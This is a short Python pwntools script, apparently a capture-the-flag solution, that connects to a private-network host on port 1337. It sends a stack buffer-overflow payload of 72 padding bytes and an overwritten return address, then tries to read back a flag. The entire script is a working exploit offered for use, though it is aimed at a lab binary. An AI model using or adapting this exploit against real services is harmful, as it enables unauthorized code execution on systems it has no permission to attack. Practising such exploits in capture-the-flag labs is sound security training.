from pwn import *
import os
import time
import struct

# Start process
p = remote("192.168.228.129", 1337)

# Debug print
print("[*] Process started, waiting for initial input...")

try:
    initial_msg = p.recvuntil(b":", timeout=2).decode()
    print("[*] Received prompt:", initial_msg)
except EOFError:
    print("[!] No input received. The binary might have crashed.")
    exit()

# Buffer overflow payload
offset = 72
ret_address = 0x0000000000401156  # Update if needed
payload = b'A' * offset + struct.pack('<Q', ret_address)

print("[*] Sending payload...")
p.sendline(payload)

# Give it time to process
time.sleep(1)

# Try to receive flag
try:
    flag = p.recvuntil(b"}").decode(errors="ignore").strip()
    print(f"[*] Flag: {flag}")
except EOFError:
    print("[!] Exploit sent, but no flag received. Check GDB.")